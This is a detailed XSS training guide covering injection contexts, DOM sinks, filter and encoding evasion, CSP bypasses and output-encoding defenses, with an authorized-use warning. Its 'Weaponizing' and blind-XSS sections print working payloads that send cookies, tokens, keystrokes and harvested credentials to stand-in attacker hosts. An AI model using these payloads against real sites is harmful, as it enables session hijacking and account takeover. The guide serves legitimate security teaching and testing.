# Cross-Site Scripting (XSS)

> **⚠️ AUTHORIZED USE ONLY.** This material is for education and authorized security testing. The payloads shown execute code in a victim's browser and are for use only on systems you own or are explicitly authorized to test, such as a designated lab platform, DVWA, or a bug bounty program within its published scope. Executing them against systems or users you do not have permission to test is unauthorized access and a criminal offence in most jurisdictions. See the [Legal and Terms of Use](/legal) page.

> `The most dangerous vulnerabilities are not the ones that crash systems. They are the ones that let attackers become the user.` — Jeremiah Grossman

> **Scope:** Client-side exploitation through Cross-Site Scripting. Covers the three XSS families, injection contexts and how to break out of them, DOM sources and sinks, filter and encoding evasion, Content Security Policy and its bypasses, the professional testing methodology, and the defenses that actually stop XSS at the code level.

---

## Table of Contents
- [Core Vocabulary](#core-vocabulary)
- [What XSS Is](#what-xss-is)
- [The Three XSS Families](#the-three-xss-families)
- [Real Impact](#real-impact)
- [Weaponizing the Payload](#weaponizing-the-payload)
- [The Testing Methodology](#the-testing-methodology)
- [Injection Contexts](#injection-contexts)
- [Reflected XSS](#reflected-xss)
- [Stored XSS](#stored-xss)
- [Blind XSS](#blind-xss)
- [DOM-Based XSS](#dom-based-xss)
- [Sources and Sinks](#sources-and-sinks)
- [postMessage and Cross-Origin XSS](#postmessage-and-cross-origin-xss)
- [Code Execution Sinks](#code-execution-sinks)
- [Client-Side Template Injection](#client-side-template-injection)
- [Filter Evasion](#filter-evasion)
- [Encoding Bypass](#encoding-bypass)
- [Polyglot Payloads](#polyglot-payloads)
- [Content Security Policy](#content-security-policy)
- [CSP Bypass](#csp-bypass)
- [Sanitizer Bypass: DOM Clobbering and mXSS](#sanitizer-bypass-dom-clobbering-and-mxss)
- [Defense: Output Encoding vs Input Validation](#defense-output-encoding-vs-input-validation)
- [Defense in Depth](#defense-in-depth)
- [Professional Reporting](#professional-reporting)
- [Troubleshooting](#troubleshooting)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Core Vocabulary

| Term | Meaning |
|------|---------|
| **XSS** | Cross-Site Scripting: injecting script that executes in another user's browser |
| **Payload** | The crafted input that achieves script execution |
| **Context** | Where in the page the input lands: HTML body, attribute, JavaScript, URL, CSS |
| **Breakout** | Escaping the current context to reach one where script executes |
| **Source** | A location where attacker-controlled data enters the page (`location.hash`, `postMessage`) |
| **Sink** | A function that renders or executes data dangerously (`innerHTML`, `eval`) |
| **Same-Origin Policy** | The browser rule preventing one origin from reading another's data |
| **CSP** | Content Security Policy, a header restricting what scripts may load and run |
| **Exfiltration** | Sending stolen data out to a server the attacker controls |
| **CWE-79** | The formal classification for Cross-Site Scripting |

**The one-sentence definition:** XSS occurs when an application places user-controlled data into a page in a way the browser interprets as **executable code** rather than **inert data**.

## 2. What XSS Is

XSS is an injection vulnerability in the browser. The application takes input from a user and writes it into a page without neutralizing it, so the browser parses the attacker's text as HTML or JavaScript and runs it.

The critical consequence is **whose privileges the code runs with**. Injected script executes in the victim's browser, inside the victim's session, with the full trust of the legitimate page. It can read cookies and tokens, access the DOM, read and modify form data, and make authenticated requests as that user. The attacker does not compromise the server; they compromise the user.

XSS is classified as **CWE-79** and falls under **A05:2025 Injection** in the current OWASP Top 10, where it is by volume the largest contributor, with more than 30,000 associated CVEs. It is high-frequency and, in the aggregate, lower-impact than SQL injection, but a single well-placed stored XSS on an authenticated page can mean full account takeover for every visitor.

### The vulnerable pattern

```javascript
// The application writes user input straight into the page
element.innerHTML = "Results for: " + userInput;
```

If `userInput` is `laptop`, the page shows text. If it is `<img src=x onerror=alert(1)>`, the browser parses it as an element, the image fails to load, and the `onerror` handler executes. The input became code.

## 3. The Three XSS Families

The distinction is **where the payload lives and when it executes**. This is the most commonly tested concept in the topic.

| | **Reflected** | **Stored** | **DOM-Based** |
|---|---------------|------------|---------------|
| **Payload location** | In the request (URL, form) | Saved in the database | Never leaves the browser |
| **Server involvement** | Server echoes it back in the response | Server stores then serves it | Server may never see it |
| **Who is affected** | Only users who follow the crafted link | Every visitor to the affected page | Users who open the crafted URL |
| **Persistence** | One-time, per request | Permanent until removed | Client-side only |
| **Delivery** | Requires social engineering (a link) | Self-delivering, victims come to it | Usually requires a link |
| **Visible in HTTP traffic** | Yes | Yes | **No** |
| **Severity** | Medium to high | **Highest** | Medium to high |

### Why stored is the most severe

Reflected XSS requires convincing each victim to click a link. Stored XSS sits in the application waiting, and every user who visits the page is exploited automatically, with no interaction beyond normal use. A stored payload in a product review, forum post, or profile bio is a persistent backdoor that fires on every page load.

### Why DOM-based is the hardest to find

In DOM-based XSS the vulnerability is entirely in client-side JavaScript: the page reads attacker-controlled data from a source and writes it to a dangerous sink without the server ever processing it. Because the payload can travel in the **URL fragment** (`#`), which browsers never send to the server, it appears in **no server log and no intercepting proxy**. Burp Suite and ZAP will not see it. Finding it requires reading the client-side JavaScript and using browser DevTools.

## 4. Real Impact

`alert(1)` proves a vulnerability exists. It is a proof of concept, not the attack. Understanding what an attacker actually does is what turns a finding into a risk rating a business will act on.

| Capability | Mechanism | Consequence |
|------------|-----------|-------------|
| **Session hijacking** | Read `document.cookie` and exfiltrate it | Full account takeover |
| **Credential harvesting** | Inject a convincing fake login form into the trusted page | Username and password capture |
| **Keylogging** | Attach an event listener to capture keystrokes | Passwords, card numbers, MFA codes |
| **Form hijacking** | Intercept form submission before it is sent | All submitted data |
| **CSRF token theft** | Read the anti-CSRF token from the DOM | Perform authenticated actions as the victim |
| **Persistent backdoor** | Stored payload re-executes on every page load | Ongoing access |
| **Defacement and phishing** | Rewrite page content | Misinformation, redirection to attacker sites |

### The exfiltration pattern

Every impact technique ends the same way: read something valuable from the page, then send it to a server the attacker controls.

```javascript
// The core pattern behind cookie theft
fetch('https://attacker-controlled.example/collect?d=' + encodeURIComponent(document.cookie));
```

### Why HttpOnly matters

A cookie flagged **HttpOnly** cannot be read by JavaScript, which defeats the simplest form of session theft. It does not defeat XSS: an attacker who can run script in the page can still make authenticated requests **as the victim**, using the session cookie the browser attaches automatically. HttpOnly raises the bar, it does not remove the vulnerability.

## 5. Weaponizing the Payload

`alert(1)` proves execution. These are the payloads that turn that proof into the impact from the previous section. All are for authorized testing only.

### Load an external script (the hook)

The most flexible approach: inject a small tag that pulls a full script from a server you control, sidestepping length limits and keeping the logic off the target.

```html
<script src=//attacker.example/x.js></script>
```

Everything else then lives in `x.js`. This is how the **BeEF** (Browser Exploitation Framework) "hook" gives an interactive session over a compromised browser.

### Cookie and token exfiltration

Several sinks send data out; pick one the page's CSP `connect-src` and `img-src` do not block.

```javascript
new Image().src = '//attacker.example/c?d=' + encodeURIComponent(document.cookie);
fetch('//attacker.example/c?d=' + encodeURIComponent(document.cookie));
navigator.sendBeacon('//attacker.example/c', document.cookie);   // survives page unload
```

If the session cookie is `HttpOnly`, read bearer tokens from the DOM or storage instead:

```javascript
new Image().src = '//attacker.example/c?t=' + localStorage.getItem('access_token');
```

### Keylogger

```javascript
document.onkeypress = e => new Image().src = '//attacker.example/k?k=' + e.key;
```

### Credential harvester

Overlay a fake login on the trusted origin; the address bar still shows the real site.

```javascript
document.body.innerHTML =
  '<form action=//attacker.example/p><h3>Session expired, please sign in</h3>' +
  'Email <input name=u><br>Password <input name=p type=password><br>' +
  '<button>Sign in</button></form>';
```

### Act as the victim (CSRF via XSS)

XSS defeats anti-CSRF tokens: the script reads the token from the DOM and submits a valid, in-session request.

```javascript
fetch('/account/email', {
  method: 'POST', credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'attacker@evil.example',
    csrf: document.querySelector('[name=csrf]').value
  })
});
```

**The escalation ladder:** `alert(1)` → exfiltrate a cookie or token → load an external hook → perform an in-session action. Demonstrate the rung that proves real business impact, not just the first.

## 6. The Testing Methodology

Professional testing is systematic, not payload-guessing. Firing a list of payloads at every field wastes time and misses context-specific bugs. The loop below is the discipline that finds them.

| Step | Action | Purpose |
|------|--------|---------|
| **1. Probe** | Submit a unique harmless marker such as `xTEST123x` | Find every place the input is reflected |
| **2. Context** | Inspect where the marker landed in the page source | Determine which context you are in |
| **3. Confirm** | Test with inert characters (`<`, `>`, `"`, `'`) | See which characters survive unencoded |
| **4. Execute** | Craft a context-appropriate breakout to run script | Achieve minimal execution (`alert`, `console.log`) |
| **5. Impact** | Upgrade to a realistic demonstration | Prove business consequence for the report |
| **6. Document** | Record payload, location, context, and impact | Produce reproducible evidence |

**Step 2 is the one people skip, and it is the one that matters.** The correct payload is entirely determined by context. A payload that works inside an HTML body does nothing inside a JavaScript string. Identify the context first, then build the payload for it.

**Use the marker to find reflections:** submit `xTEST123x`, then search the rendered page source for it. It may appear in several places at once, each in a different context, and each is a separate potential injection point.

## 7. Injection Contexts

Context determines the payload. There are five common ones, each requiring a different breakout.

### HTML body context

Input lands between tags. New elements can be introduced directly.

```html
<div>xTEST123x</div>
```

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### HTML attribute context

Input lands inside a tag attribute. You must first close the attribute (and possibly the tag).

```html
<input type="text" value="xTEST123x">
```

```html
"><script>alert(1)</script>          break out of attribute and tag
" onfocus="alert(1)" autofocus="     stay in the tag, add an event handler
" onmouseover="alert(1)                  requires user interaction
```

If quotes are stripped but the attribute is unquoted, a space is enough to add a new attribute:

```html
<input value=xTEST123x>
xTEST123x onmouseover=alert(1)
```

### JavaScript context

Input lands inside a script block, usually within a string. You must break the string, and keep the surrounding syntax valid.

```html
<script>var q = "xTEST123x";</script>
```

```javascript
";alert(1);//                  close the string, run code, comment out the rest
';alert(1);//                  single-quote variant
</script><script>alert(1)</script>    close the whole block (works if < is not encoded)
\';alert(1);//                 when the app escapes quotes with a backslash
```

### URL context

Input lands in an `href`, `src`, or similar attribute. A URL scheme can carry the payload.

```html
<a href="xTEST123x">link</a>
```

```html
javascript:alert(1)
```

### CSS context

Input lands inside a style block or attribute. Modern browsers have removed most CSS-based script execution (`expression()` is long dead), so this context is now mainly useful for data exfiltration through selectors and background-image requests rather than direct execution.

### Comment and RAWTEXT/RCDATA contexts

Some positions look inert but are escapable by closing the enclosing element first.

```html
<!-- xTEST123x -->               is escaped by:  --><script>alert(1)</script>
<title>xTEST123x</title>         is escaped by:  </title><script>alert(1)</script>
<textarea>xTEST123x</textarea>   is escaped by:  </textarea><script>alert(1)</script>
<style>/*xTEST123x*/</style>     is escaped by:  </style><script>alert(1)</script>
```

`<title>` and `<textarea>` are **RCDATA**; `<style>` and `<script>` are **RAWTEXT**. The browser will not parse tags inside them, so a payload only fires after the correct closing tag. An HTML comment needs `-->` to escape.

### The context decision table

| Where the marker appears | First move |
|--------------------------|-----------|
| Between tags | Inject a new tag with an event handler |
| Inside a quoted attribute | Close the quote, then either break the tag or add a handler |
| Inside an unquoted attribute | Add a space and a new event-handler attribute |
| Inside a JavaScript string | Close the quote, inject code, comment out the remainder |
| Inside `href` or `src` | Use the `javascript:` scheme |
| Inside `<title>`, `<textarea>`, `<style>` | Close the element (`</textarea>`), then inject |
| Inside an HTML comment | Close it with `-->`, then inject |

## 8. Reflected XSS

The payload travels in the request and is echoed straight back in the response.

### Finding it

Test every parameter the application reflects: search boxes, error messages, filters, sort orders, "not found" pages, and any parameter appearing in the rendered output. URL parameters are the most common vector.

```text
https://target.example/search?q=xTEST123x
```

Locate the marker in the response, identify the context, and build the breakout from Section 6.

### Delivery

Reflected XSS is only exploitable if a victim visits the crafted URL, so a real attack requires delivery: a phishing email, a chat message, a malicious ad, or a link posted where the target audience will click it. This is why reflected XSS usually rates below stored: it needs user interaction and a plausible pretext.

In a report, the realistic scenario matters. "An attacker sends a support-desk employee a link that appears to be an internal search result, and takes over their session" is a business risk. "A parameter reflects input" is not.

## 9. Stored XSS

The payload is submitted once, saved by the application, and served to everyone who views the affected page.

### Where to look

Anywhere user content is saved and later displayed to other users: product reviews, comments, forum posts, profile fields and bios, display names, uploaded file names, support tickets, and chat messages. Fields displayed in an **admin panel** are especially valuable, since a payload that fires in an administrator's browser executes with administrative session privileges.

### Why it is the most severe

No social engineering is required. The payload waits in the application and executes automatically for every visitor. One injection into a popular page can compromise thousands of sessions, and because the payload persists, it keeps working until someone finds and removes it.

### Second-order behavior

Stored XSS often shows the same delayed pattern as second-order SQL injection: input is accepted and stored safely, escaping correctly on the way in, but a **different page** later renders it without encoding. Testing the submission form alone will not reveal it. Always check everywhere the stored value is subsequently displayed, including admin views, exports, and notification emails.

## 10. Blind XSS

Blind XSS is stored XSS that fires somewhere you cannot see: an admin dashboard, a log viewer, a support-ticket console, a CRM, an analytics backend, or a server-rendered PDF or email. You submit through one interface and the payload executes later in someone else's browser, so an in-browser check at submission time shows nothing.

### Detecting it out-of-band

With no visible reflection, the payload must **call home** when it eventually runs.

```html
"><script src=//blind.attacker.example/x.js></script>
```

The hosted script reports where it fired:

```javascript
new Image().src = '//blind.attacker.example/r?u=' + encodeURIComponent(location) +
  '&c=' + encodeURIComponent(document.cookie) +
  '&dom=' + encodeURIComponent(document.domain);
```

The callback confirms the payload fired, on which URL and origin, in which browser, often with a DOM snapshot or screenshot. **XSS Hunter** (self-hostable) is the standard tool; a plain HTTP collector works too.

### Where to plant it

Anything a human operator reviews later: the `User-Agent` and `Referer` headers (they land in log viewers), contact-form and support-ticket bodies, order and company names, profile fields shown in admin, and uploaded file names. Seed several markers, then wait for a callback.

**Why it matters:** blind XSS routinely lands in high-privilege internal tools that never appear in the normal test scope, which is exactly why it is easy to miss and high-impact.

## 11. DOM-Based XSS

The vulnerability lives entirely in client-side JavaScript. The page takes data from an attacker-controllable **source** and passes it to a dangerous **sink** without sanitization. The server may never see the payload at all.

```javascript
// Vulnerable: reads the fragment and writes it as HTML
document.getElementById('output').innerHTML = location.hash.substring(1);
```

```text
https://target.example/page#<img src=x onerror=alert(1)>
```

### Why it evades normal testing

Everything after `#` in a URL is the **fragment**, and browsers do not transmit it to the server. The payload therefore appears in no server-side log, no WAF inspection, and no intercepting proxy history. Automated scanners that work from HTTP traffic routinely miss DOM XSS entirely.

**Finding it requires client-side analysis:** read the JavaScript for sinks, trace backwards to find which sources reach them, and use browser DevTools to confirm. In Chrome DevTools, setting a breakpoint on DOM modification or searching the loaded scripts for sink names is the practical approach.

## 12. Sources and Sinks

DOM XSS is a data-flow problem. Learn the two lists and the vulnerability becomes a matter of connecting them.

### Common sources (attacker-controllable input)

| Source | Notes |
|--------|-------|
| `location.hash` | The fragment, never sent to the server |
| `location.search` | The query string |
| `location.href`, `document.URL` | The full URL |
| `document.referrer` | The referring page |
| `window.name` | Persists across navigations, a classic vector |
| `postMessage` data | Cross-origin messages |
| `localStorage`, `sessionStorage` | If attacker-influenced earlier |
| Cookies | If attacker-influenced earlier |

### Common sinks (dangerous destinations)

| Sink | Why it is dangerous |
|------|---------------------|
| `innerHTML`, `outerHTML` | Parses the string as HTML |
| `document.write()`, `document.writeln()` | Writes directly into the parser |
| `eval()` | Executes the string as JavaScript |
| `setTimeout()`, `setInterval()` with a string | Executes the string as code |
| `Function()` constructor | Compiles a string into a function |
| `element.setAttribute()` on event handlers or `href` | Can introduce `javascript:` or handlers |
| `location`, `location.href` assignment | Can navigate to `javascript:` |
| `insertAdjacentHTML()` | Parses as HTML |
| jQuery `$()`, `.html()`, `.append()` | HTML parsing under the hood |

**The safe alternatives are the point:** `textContent` and `innerText` insert data as text and never parse it as HTML. Replacing `innerHTML` with `textContent` eliminates the vulnerability outright wherever markup is not genuinely required.

## 13. postMessage and Cross-Origin XSS

`postMessage` is the browser API that allows two windows of different origins to communicate deliberately, bypassing the Same-Origin Policy by mutual consent. Insecure use makes it an XSS source.

```javascript
// Vulnerable receiver: no origin check, data goes to a dangerous sink
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});
```

Two independent failures appear here:

1. **No origin validation.** The handler accepts messages from any window, including an attacker's page that opened or framed the target.
2. **Unsafe sink.** The message data is written with `innerHTML`.

An attacker page can then send a payload directly into the vulnerable page:

```javascript
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

### The secure pattern

```javascript
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://trusted.example') return;   // validate the sender
    document.getElementById('content').textContent = e.data;  // safe sink
});
```

Always validate `e.origin` against an explicit allow-list, and never pass message data to an HTML-parsing sink. On the sending side, specify an exact target origin rather than the `*` wildcard, so the message cannot be read by an unexpected window.

## 14. Code Execution Sinks

Some sinks execute strings as JavaScript directly, turning any injected value into code with no HTML parsing involved.

```javascript
eval(userInput);                        // direct execution
setTimeout("doThing(" + userInput + ")", 100);   // string form executes
new Function(userInput)();              // compiles and runs
```

Where the application already passes data into one of these, no tag or event handler is needed. Plain JavaScript is enough:

```javascript
alert(1)
fetch('https://attacker-controlled.example/?d='+document.cookie)
```

**The defense is categorical:** never pass user-controlled data to `eval`, the `Function` constructor, or the string form of `setTimeout` and `setInterval`. For parsing data, use `JSON.parse`, which reads data without executing it. For deferred execution, pass a function reference rather than a string:

```javascript
setTimeout(function() { doThing(value); }, 100);   // safe form
```

## 15. Client-Side Template Injection

When a page uses a client-side template engine (AngularJS, Vue, Handlebars) and lets user input reach the template, injecting **template syntax** rather than HTML executes code. Standard HTML output encoding does not stop it, because `{{ }}` is not made of dangerous HTML characters.

### Detecting it

Inject `{{7*7}}`. If the page renders **49**, template expressions are being evaluated and you have CSTI, not plain HTML injection. This is the client-side mirror of the server-side `{{7*7}}` test.

### AngularJS

If input lands inside an `ng-app` scope, expressions evaluate. AngularJS removed its expression sandbox in 1.6 (it was never a security boundary), so a bare expression runs:

```text
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

### Vue

When user input is compiled as a Vue template, the same reflection-based escape applies:

```text
{{constructor.constructor('alert(1)')()}}
```

**Why it matters:** a value that is correctly HTML-encoded can still be a live template expression. A framework that is "safe against XSS" for normal interpolation is still injectable when raw input reaches the template itself.

## 16. Filter Evasion

Applications frequently attempt to block XSS with a denylist of dangerous strings. Denylists are hard to make complete, and the techniques below exploit the gaps. Each one also demonstrates precisely why denylisting is the wrong defense.

### Case manipulation

HTML tag and attribute names are case-insensitive, so a filter matching lowercase `<script>` misses variants.

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### Alternative tags and handlers

When `<script>` is blocked, many other elements carry event handlers.

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
```

### Tag stripping that runs once

A filter that removes `<script>` a single time can be defeated by nesting, because removing the inner occurrence reassembles a valid tag.

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Avoiding blocked characters

| Blocked | Workaround |
|---------|-----------|
| Parentheses | `<img src=x onerror="alert\`1\`">` (template literals) |
| Spaces | `<img/src=x/onerror=alert(1)>` (slashes as separators) |
| Quotes | Use unquoted attribute values |
| The word `alert` | `window['al'+'ert'](1)`, or use `confirm` / `print` |
| Semicolons | Often unnecessary in short payloads |

### Whitespace and separators

Browsers tolerate a variety of characters where a filter may expect only a space:

```html
<img src=x onerror =alert(1)>
<img/src=x/onerror=alert(1)>
```

**The lesson for defenders:** a denylist is a bet that the author anticipated every variant, and HTML parsing offers far too many equivalent forms for that bet to succeed. This is why output encoding, not filtering, is the correct defense.

## 17. Encoding Bypass

Encoding tricks exploit the difference between what the **filter** sees and what the **browser** decodes.

### HTML entity encoding

The browser decodes entities before executing, so a filter matching literal text can be bypassed.

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

### URL encoding and double encoding

Where a value is decoded more than once (for example by a proxy and again by the application), double encoding survives the first pass and becomes live on the second.

```text
%3Cscript%3E                single-encoded  <script>
%253Cscript%253E            double-encoded, decodes to %3Cscript%3E then <script>
```

### JavaScript escapes

Inside a JavaScript context, several escape forms represent the same characters.

```javascript
\u0061lert(1)                     unicode escape
eval('\x61lert(1)')               hex escape
```

### Base64 with an execution sink

```javascript
eval(atob('YWxlcnQoMSk='))        decodes and runs alert(1)
```

### Unicode normalization

Some applications normalize Unicode **after** validating, so a character that passes the filter transforms into a dangerous one afterward. Full-width and alternative code points that normalize to ASCII quotes or angle brackets are the classic case. Where normalization happens after the security check, the check is meaningless.

**The general principle:** validate and encode at the **same stage** and in the **same representation** the browser will ultimately interpret. Any decoding or normalization that happens after the security check reopens the hole.

## 18. Polyglot Payloads

A polyglot is one payload crafted to break out and execute across **several contexts at once**, so a single string can be fired at many injection points before the context is known. It trades length for coverage.

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

It survives inside JavaScript strings, HTML comments, `title`/`textarea`/`style` RAWTEXT blocks, attributes, and the `javascript:` scheme, because it closes each of them in turn. This is the well-known Ashar Javed / `0xsobky` polyglot.

**How to use it:** fire the polyglot at every parameter as a fast first pass. A hit tells you a field is injectable; then drop to a clean, context-specific payload from Section 6 for a reliable proof of concept. A polyglot is a discovery tool, not a substitute for understanding the context.

## 19. Content Security Policy

CSP is an HTTP response header that tells the browser which sources of script, style, and other resources are permitted. It is the primary **defense-in-depth** control against XSS: it does not fix the injection, it limits what injected script can do.

```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

### Key directives

| Directive | Controls |
|-----------|----------|
| `default-src` | The fallback for all resource types |
| `script-src` | Where scripts may load from, and whether inline script runs |
| `style-src` | Stylesheet sources |
| `img-src` | Image sources |
| `connect-src` | Where `fetch` and `XMLHttpRequest` may send data |
| `frame-ancestors` | Who may frame the page (clickjacking defense) |
| `object-src` | Plugins, should be `'none'` |
| `base-uri` | Restricts `<base>`, preventing base-tag hijacking |

### Source values

| Value | Meaning |
|-------|---------|
| `'self'` | The page's own origin |
| `'none'` | Nothing allowed |
| `'unsafe-inline'` | **Permits inline script, largely defeating CSP's XSS protection** |
| `'unsafe-eval'` | Permits `eval` and friends |
| `'nonce-<random>'` | Only scripts carrying this one-time token run |
| `'strict-dynamic'` | Trust scripts loaded by already-trusted scripts |

### A strong policy

```text
Content-Security-Policy: default-src 'none'; script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

Nonce-based policies with `strict-dynamic` are the modern recommendation, because they do not depend on maintaining a host allow-list, which is where most bypasses come from.

## 20. CSP Bypass

CSP is frequently deployed with weaknesses that reduce or eliminate its protection. Identifying these is a standard part of assessment.

| Weakness | Why it fails |
|----------|-------------|
| **`'unsafe-inline'` in `script-src`** | Inline script is exactly what XSS injects. The policy stops almost nothing |
| **`'unsafe-eval'`** | Restores `eval`, enabling string-to-code execution |
| **Wildcard sources (`*`)** | Any origin may serve script |
| **`data:` in `script-src`** | The payload can be embedded in a data URI |
| **Missing `object-src`** | Plugin-based execution paths remain open |
| **Missing `base-uri`** | A `<base>` tag can redirect relative script URLs to an attacker host |
| **Overly broad allow-listed CDN** | See JSONP and library abuse below |

### JSONP endpoints on an allow-listed domain

If CSP permits scripts from a domain that hosts a **JSONP** endpoint, that endpoint reflects a caller-supplied callback name into executable JavaScript, from an origin the policy trusts.

```html
<script src="https://allowed-cdn.example/api?callback=alert(1)"></script>
```

The browser loads it because the host is allow-listed, and the endpoint returns `alert(1)(...)`, which executes. This is the most common real-world CSP bypass and the strongest argument for nonce-based policies over host allow-lists.

### Vulnerable libraries on an allow-listed domain

Some widely hosted libraries contain gadgets that turn benign-looking markup into script execution once loaded. If a CDN hosting such a version is allow-listed, an injected element can trigger it. Allow-listing a large CDN effectively trusts everything on it.

### Nonce reuse or predictability

A nonce must be **unpredictable and unique per response**. If it is static, reused across responses, or guessable, an attacker simply includes the correct nonce in the injected script tag.

**Reading the failure:** the browser's console prints a CSP violation naming the exact directive that blocked the resource. That message is the fastest way to understand what a policy permits and where its gaps are.

## 21. Sanitizer Bypass: DOM Clobbering and mXSS

When an application sanitizes HTML (DOMPurify, the browser Sanitizer API) instead of blocking it outright, two techniques target the sanitizer itself.

### DOM clobbering

Sanitizers strip scripts but often allow `id` and `name` attributes. Named elements become properties on `document` and `window`, so injected markup can **overwrite JavaScript variables** the page depends on, with no script at all.

```html
<a id=x href="javascript:alert(1)">
<img name=getElementById>                        <!-- clobbers document.getElementById -->
<form id=config><input name=isAdmin value=1></form>
```

If page code trusts `window.x`, `config.isAdmin`, or a clobbered built-in, injected HTML alone changes its behavior, often turning a "safe" HTML injection into script execution or a logic bypass.

### Mutation XSS (mXSS)

The browser's HTML parser **rewrites** markup after the sanitizer has already approved it. A string that is inert when the sanitizer inspects it can mutate into a live payload once inserted into the DOM, especially inside `<template>`, `<math>`, `<svg>`, or namespace-confusing markup. Most mXSS bugs are specific, fixed versions of DOMPurify being defeated by exactly these tricks.

**Why it matters:** "we sanitize with DOMPurify" is not automatically safe if the version is old or the config allows clobberable attributes. Sanitizer choice, version, and configuration are all part of the attack surface.

## 22. Defense: Output Encoding vs Input Validation

This distinction is the core of XSS prevention and the most important defensive concept in the topic.

| | Input validation | Output encoding |
|---|------------------|-----------------|
| **When** | As data enters the application | As data is written into a page |
| **Question** | Is this input the expected shape? | Is this data safe in *this* context? |
| **Role** | Defense in depth | **The primary fix** |
| **Sufficient alone?** | No | Yes, when applied correctly per context |

### Why output encoding is the real fix

The same value is safe in one place and dangerous in another. `</script>` is harmless text in an HTML body but terminates a script block inside one. Because danger is determined by **destination**, not by origin, the neutralization must happen at the point of output, where the destination context is known. Encoding at output converts characters with syntactic meaning into their inert representations, so the browser renders them as text rather than parsing them as markup.

### Encoding is context-specific

| Output context | Encoding required |
|----------------|-------------------|
| HTML body | HTML entity encoding (`<` becomes `&lt;`, `&` becomes `&amp;`) |
| HTML attribute | Attribute encoding, and always quote the attribute |
| JavaScript string | JavaScript escaping (`\x22`, `\u0027` style) |
| URL parameter | URL encoding |
| CSS value | CSS escaping |

Applying HTML encoding to data destined for a JavaScript string does not protect it. Using the wrong encoding for the context is a common and complete failure.

### Why input validation is not enough

Input validation is genuinely valuable: allow-listing expected formats reduces the attack surface and catches malformed data early. But many fields legitimately need to accept characters that are dangerous in HTML. A product review must allow apostrophes; a name field may contain them. Validation cannot reject everything dangerous without rejecting legitimate content, and it cannot know which of several output contexts the value will eventually reach. Use it as a layer, and rely on output encoding as the fix.

## 23. Defense in Depth

| Layer | Role |
|-------|------|
| **Context-aware output encoding** | The primary fix. Neutralizes data at the point of rendering |
| **Framework auto-escaping** | React, Angular, and Vue escape by default. The main risk is deliberately bypassing it (`dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust`) |
| **Safe DOM APIs** | `textContent` instead of `innerHTML`; never `eval` |
| **Sanitization libraries** | Where HTML must genuinely be allowed, use a maintained sanitizer such as DOMPurify rather than a hand-rolled filter |
| **Content Security Policy** | Limits the impact of any injection that succeeds |
| **HttpOnly cookies** | Prevents JavaScript reading session cookies |
| **SameSite cookies** | Limits cross-site request abuse |
| **Input validation (allow-list)** | Reduces attack surface early |
| **Trusted Types** | Emerging browser feature that enforces safe assignment to DOM sinks |

**The priority is unambiguous:** context-aware output encoding, or a framework that performs it automatically, is the fix. CSP, HttpOnly, and sanitization are containment and reinforcement. A denylist filter is not a defense.

**The modern framework caveat:** React, Angular, and Vue escape interpolated values by default, which is why XSS has become less common in applications built on them. Nearly all XSS in such applications comes from an explicit escape hatch, so those functions deserve special scrutiny in code review.

## 24. Professional Reporting

Finding the bug is half the work. A finding only gets fixed when the report makes the risk and the remediation clear.

### What a finding must contain

| Element | Content |
|---------|---------|
| **Title** | The vulnerability type and location |
| **Severity** | A rating with the reasoning behind it |
| **Affected component** | Exact URL, parameter, and field |
| **Type** | Reflected, stored, or DOM-based |
| **Reproduction steps** | Precise, numbered, and verifiable |
| **Proof of concept** | The payload and evidence of execution |
| **Business impact** | What an attacker achieves, in business terms |
| **Remediation** | Specific, actionable guidance |
| **References** | CWE-79, OWASP guidance |

### Rating severity

Severity depends on more than the fact of execution. Weigh: the XSS type (stored outranks reflected), whether the affected page is authenticated, the privilege of typical viewers (an admin panel is far more serious), how many users are exposed, what data is reachable, and whether existing controls such as CSP or HttpOnly limit the impact.

### Writing business impact

Translate the technical finding into a consequence a decision-maker can act on.

| Instead of | Write |
|------------|-------|
| "The `q` parameter is vulnerable to reflected XSS." | "An attacker who sends a support agent a crafted link can execute code in the agent's session and take over their authenticated account, gaining access to customer records." |
| "Stored XSS in product reviews." | "Any visitor viewing this product page has their session token exposed to the attacker. With this page's traffic, a single injected review could compromise thousands of customer accounts." |

### Remediation to recommend

Apply context-aware output encoding at every point the value is rendered; replace dangerous sinks with safe equivalents such as `textContent`; where HTML must be permitted, sanitize with a maintained library; deploy a nonce-based CSP without `unsafe-inline`; and set `HttpOnly` and `SameSite` on session cookies. Naming the specific fix for the specific sink is far more useful to a developer than "sanitize user input."

## 25. Troubleshooting

| Symptom | Likely cause | What to do |
|---------|--------------|-----------|
| **Payload appears as text on the page** | It is being HTML-encoded on output | Check the rendered source. If `<` shows as `&lt;`, encoding is working; look for another injection point or context |
| **Payload is in the DOM but does not run** | Wrong context, or an inert location | Inspect the element. Script inside an attribute value or a non-executing position needs a different breakout |
| **Works in the DevTools console, not through the field** | The console is not injection | The console runs code in an already-trusted context. Only injection through the actual input proves the vulnerability |
| **Nothing happens and no error** | The input may not reach the page at all | Re-probe with a unique marker and search the full response |
| **Script blocked with a console error** | CSP is enforcing | Read the violation message; it names the directive that blocked it |
| **`<script>` stripped but other tags survive** | Denylist filtering | Try alternative tags and event handlers from Section 13 |
| **Works in one browser, not another** | Parser differences | Note the affected browsers in the report; it is still a valid finding |

